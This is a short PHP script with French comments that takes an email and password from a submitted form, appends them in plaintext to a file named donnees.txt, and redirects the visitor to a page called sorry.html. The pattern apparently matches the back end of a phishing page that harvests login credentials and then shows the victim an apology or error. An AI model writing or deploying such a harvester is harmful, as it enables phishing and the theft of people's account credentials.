<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // RÃ©cupÃ©rer les donnÃ©es du formulaire
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Faire quelque chose avec les donnÃ©es (par exemple, les enregistrer dans un fichier)
    $file = fopen("donnees.txt", "a");
    fwrite($file, "Email: $email, Mot de passe: $password\n");
    fclose($file);

    // Rediriger ou afficher un message de confirmation
    header("Location: sorry.html");
    exit();
}
?>